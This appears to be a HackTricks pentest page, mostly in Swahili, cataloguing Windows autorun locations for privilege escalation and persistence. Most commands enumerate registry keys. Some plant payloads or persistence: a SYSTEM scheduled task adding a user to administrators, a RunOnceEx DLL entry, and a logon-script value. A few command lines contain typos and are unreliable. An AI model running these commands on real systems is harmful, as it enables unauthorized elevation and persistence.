# Privilege Escalation with Autoruns

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** inaweza kutumika kuendesha programu wakati wa **startup**. Angalia ni binaries zipi zimepangwa kuendeshwa wakati wa startup kwa:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Scheduled Tasks

**Tasks** zinaweza kupangwa ili ziendeshe kwa **marudio fulani**. Angalia ni binaries zipi zimepangwa kuendeshwa kwa:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Folda

Binaries zote zilizo katika **Startup folders zitaendeshwa wakati wa startup**. Common startup folders ni zile zilizoorodheshwa hapa chini, lakini startup folder inaonyeshwa kwenye registry. [Soma hii ili kujifunza wapi.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
> **FYI**: Archive extraction *path traversal* vulnerabilities (such as the one abused in WinRAR prior to 7.13 – CVE-2025-8088) can be leveraged to **deposit payloads directly inside these Startup folders during decompression**, resulting in code execution on the next user logon.  For a deep-dive into this technique see:


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## Registry

> [!TIP]
> [Note from here](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): The **Wow6432Node** registry entry indicates that you are running a 64-bit Windows version. The operating system uses this key to display a separate view of HKEY_LOCAL_MACHINE\SOFTWARE for 32-bit applications that run on 64-bit Windows versions.

### Runs

**Commonly known** AutoRun registry:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Vifunguo vya Registry vinavyojulikana kama **Run** na **RunOnce** vimeundwa ili kuendesha programu kiotomatiki kila mara mtumiaji anapoingia kwenye mfumo. Mstari wa amri uliowekwa kama thamani ya data ya ufunguo una kikomo cha herufi 260 au chini.

**Service runs** (inaweza kudhibiti uanzishaji wa kiotomatiki wa huduma wakati wa boot):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Katika Windows Vista na matoleo ya baadaye, vifunguo vya Registry **Run** na **RunOnce** havitengenezwi kiotomatiki. Maingizo katika vifunguo hivi yanaweza kuanzisha programu moja kwa moja au kuyaweka kama utegemezi. Kwa mfano, ili kupakia faili ya DLL wakati wa logon, mtu anaweza kutumia ufunguo wa Registry **RunOnceEx** pamoja na ufunguo wa "Depend". Hii inaonyeshwa kwa kuongeza ingizo la Registry ili kutekeleza "C:\temp\evil.dll" wakati wa kuanza kwa mfumo:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!TIP]
> **Exploit 1**: Ikiwa unaweza kuandika ndani ya yoyote ya registry iliyotajwa ndani ya **HKLM** unaweza kuongeza privileges wakati user tofauti anaingia.

> [!TIP]
> **Exploit 2**: Ikiwa unaweza ku-overwrite yoyote ya binaries zilizoonyeshwa kwenye yoyote ya registry ndani ya **HKLM** unaweza kurekebisha hiyo binary kwa backdoor wakati user tofauti anaingia na kuongeza privileges.
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Njia ya Startup

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Shortcuts zilizowekwa kwenye folda ya **Startup** zitaanzisha moja kwa moja services au applications ili zianze wakati wa user logon au system reboot. Mahali pa folda ya **Startup** hufafanuliwa kwenye registry kwa scopes za **Local Machine** na **Current User** zote. Hii ina maana kwamba shortcut yoyote iliyoongezwa kwenye maeneo haya maalum ya **Startup** itahakikisha service au program iliyounganishwa inaanza baada ya mchakato wa logon au reboot, na kuifanya kuwa njia rahisi ya kupanga programs ziendeshe moja kwa moja.

> [!TIP]
> Ukifaulu ku-overwrite yoyote ya \[User] Shell Folder chini ya **HKLM**, utaweza kui-point kwenye folder unayodhibiti na kuweka backdoor ambayo itatekelezwa kila wakati mtumiaji anapoingia kwenye system, hivyo kuongeza privileges.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

Thamani hii ya registry kwa kila mtumiaji inaweza kuelekeza kwenye script au command ambayo hutekelezwa wakati huyo mtumiaji anaingia. Kimsingi ni primitive ya **persistence** kwa sababu inaendeshwa tu katika context ya mtumiaji aliyeathiriwa, lakini bado inafaa kuangaliwa wakati wa post-exploitation na ukaguzi wa autoruns.

> [!TIP]
> Ikiwa unaweza kuandika thamani hii kwa mtumiaji wa sasa, unaweza kusababisha tena execution wakati wa next interactive logon bila kuhitaji admin rights. Ikiwa unaweza kuiandika kwa hive ya mtumiaji mwingine, unaweza kupata code execution wakati huyo mtumiaji anaingia.
```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```
Maelezo:

- Pendelea njia kamili hadi `.bat`, `.cmd`, `.ps1`, au faili nyingine za launcher ambazo tayari zinaweza kusomwa na user lengwa.
- Hii husalia baada ya logoff/reboot hadi value iondolewe.
- Tofauti na `HKLM\...\Run`, hii haipei elevation yenyewe; ni user-scope persistence.

### Winlogon Keys

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Kwa kawaida, key ya **Userinit** huwekwa kuwa **userinit.exe**. Hata hivyo, ikiwa key hii itabadilishwa, executable iliyobainishwa pia itazinduliwa na **Winlogon** wakati user anapo-logon. Vivyo hivyo, key ya **Shell** inakusudiwa kuelekeza kwenye **explorer.exe**, ambayo ni default shell ya Windows.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!TIP]
> Ukiweza kuandika upya thamani ya registry au binary, utaweza kuongeza privileges.

### Policy Settings

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Angalia key ya **Run**.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Kubadilisha Safe Mode Command Prompt

Katika Windows Registry chini ya `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, kuna thamani ya **`AlternateShell`** iliyowekwa kwa chaguo-msingi kuwa `cmd.exe`. Hii inamaanisha unapochagua "Safe Mode with Command Prompt" wakati wa startup (kwa kubonyeza F8), `cmd.exe` hutumiwa. Hata hivyo, inawezekana kusanidi kompyuta yako ili ianze kiotomatiki katika mode hii bila kuhitaji kubonyeza F8 na kuichagua mwenyewe.

Hatua za kuunda boot option ya kuanzisha kiotomatiki katika "Safe Mode with Command Prompt":

1. Badilisha attributes za faili `boot.ini` ili kuondoa flags za read-only, system, na hidden: `attrib c:\boot.ini -r -s -h`
2. Fungua `boot.ini` kwa kuhariri.
3. Ongeza line kama: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Hifadhi mabadiliko kwenye `boot.ini`.
5. Weka upya attributes za awali za faili: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** Kubadilisha registry key ya **AlternateShell** kunaruhusu custom command shell setup, ikiwemo uwezekano wa kupata unauthorized access.
- **Exploit 2 (PATH Write Permissions):** Kuwa na write permissions kwenye sehemu yoyote ya system **PATH** variable, hasa kabla ya `C:\Windows\system32`, hukuruhusu kuendesha custom `cmd.exe`, ambayo inaweza kuwa backdoor ikiwa system inaanzishwa katika Safe Mode.
- **Exploit 3 (PATH and boot.ini Write Permissions):** Kuwa na write access kwenye `boot.ini` kunaruhusu automatic Safe Mode startup, na hivyo kuwezesha unauthorized access kwenye reboot inayofuata.

Ili kuangalia current **AlternateShell** setting, tumia commands hizi:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Installed Component

Active Setup ni feature katika Windows ambayo **huanza kabla ya desktop environment kupakiwa kikamilifu**. Huipa kipaumbele utekelezaji wa baadhi ya commands, ambazo lazima zikamilike kabla ya user logon kuendelea. Mchakato huu hutokea hata kabla ya startup entries nyingine, kama zile zilizo kwenye sehemu za registry za Run au RunOnce, ku-trigger.

Active Setup inasimamiwa kupitia registry keys zifuatazo:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Ndani ya keys hizi, subkeys mbalimbali zipo, kila moja ikilingana na component maalum. Key values za umuhimu maalum ni pamoja na:

- **IsInstalled:**
- `0` inaonyesha command ya component haitatekelezwa.
- `1` inamaanisha command itatekelezwa mara moja kwa kila user, ambayo ni default behavior ikiwa value ya `IsInstalled` haipo.
- **StubPath:** Hufafanua command itakayotekelezwa na Active Setup. Inaweza kuwa command line yoyote halali, kama vile kuzindua `notepad`.

**Security Insights:**

- Kurekebisha au kuandika kwenye key ambapo **`IsInstalled`** imewekwa kuwa `"1"` pamoja na **`StubPath`** maalum kunaweza kusababisha unauthorized command execution, na hivyo kuweza kutoa privilege escalation.
- Kubadili binary file iliyorejelewa katika value yoyote ya **`StubPath`** pia kunaweza kufanikisha privilege escalation, ikiwa kuna permissions za kutosha.

Ili kukagua usanidi wa **`StubPath`** katika Active Setup components, commands hizi zinaweza kutumika:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Overview of Browser Helper Objects (BHOs)

Browser Helper Objects (BHOs) ni moduli za DLL zinazoongeza vipengele vya ziada kwa Microsoft Internet Explorer. Hupakiwa ndani ya Internet Explorer na Windows Explorer kila zinapoanza. Hata hivyo, utekelezaji wao unaweza kuzuiwa kwa kuweka ufunguo **NoExplorer** kuwa 1, na hivyo kuwazuia kupakiwa pamoja na matukio ya Windows Explorer.

BHOs zinaendana na Windows 10 kupitia Internet Explorer 11 lakini hazitumiki katika Microsoft Edge, kivinjari chaguo-msingi katika matoleo mapya ya Windows.

Ili kuchunguza BHOs zilizosajiliwa kwenye mfumo, unaweza kukagua funguo zifuatazo za registry:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Kila BHO huwakilishwa na **CLSID** yake katika registry, ikitumika kama kitambulisho cha kipekee. Taarifa za kina kuhusu kila CLSID zinaweza kupatikana chini ya `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Kwa kuuliza BHOs kwenye registry, amri hizi zinaweza kutumika:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Internet Explorer Extensions

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Kumbuka kwamba registry itakuwa na 1 new registry kwa kila dll na itawakilishwa na **CLSID**. Unaweza kupata info ya CLSID katika `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Font Drivers

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Fungua Command

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Chaguzi za Utekelezaji wa Faili za Picha
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Kumbuka kwamba tovuti zote ambako unaweza kupata autoruns tayari zimeshachunguzwa na [winpeas.exe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Hata hivyo, kwa orodha ya **kamilifu zaidi ya faili zinazotekelezwa kiotomatiki** unaweza kutumia [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)kutoka systinternals:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## More

**Pata Autoruns zaidi kama registries katika** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)

## References

- [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
- [https://attack.mitre.org/techniques/T1037/001/](https://attack.mitre.org/techniques/T1037/001/)
- [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)



{{#include ../../banners/hacktricks-training.md}}
